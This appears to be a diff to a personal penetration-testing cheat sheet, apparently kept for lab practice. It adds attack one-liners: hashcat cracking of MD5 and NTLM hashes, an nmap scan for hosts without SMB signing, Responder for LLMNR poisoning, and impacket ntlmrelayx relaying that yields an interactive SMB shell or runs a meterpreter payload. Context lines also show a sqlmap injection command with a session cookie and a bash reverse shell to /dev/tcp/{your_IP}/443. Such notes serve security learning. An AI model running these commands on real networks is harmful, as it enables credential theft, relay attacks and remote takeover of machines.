@@ -65,10 +65,18 @@
  - `john zip.hashes` cracks the password.
 
 ### Hashcat
- - `hashcat -a 0 -m 0 admin_hash.txt /usr/share/wordlists/rockyou.txt`
+ - `hashcat -a 0 -m 0 admin_hash.txt /usr/share/wordlists/rockyou.txt` crack md5.
+ - `hashcat -m 5600 hash.txt rockyou.txt` crach ntlm.
+
+### nmap
+ - `nmap --script=smb2-security-mode.nse -p445 <network>/24` find devices with smb signing disabled.
 
 ### sqlmap
  - `sqlmap -u "http://10.129.29.21/dashboard.php?search=%27" --cookie="PHPSESSID=f0mn05nbrdadh5164gavl9q4un"`
+
+### Responder
+ - `sudo ./test/bin/python Responder.py -I vboxnet0 -rdwv` listen and respond for LLMNR poisioning.
+ - `impacket-ntlmrelayx -tf targets.txt -smb2support` pass the hash, targets.txt has victims ip, `-i` to get interactive smb shell, `-e meterpreter.exe`.
 
 ### bash
  - `bash -c "bash -i >& /dev/tcp/{your_IP}/443 0>&1"`, reverse shell.
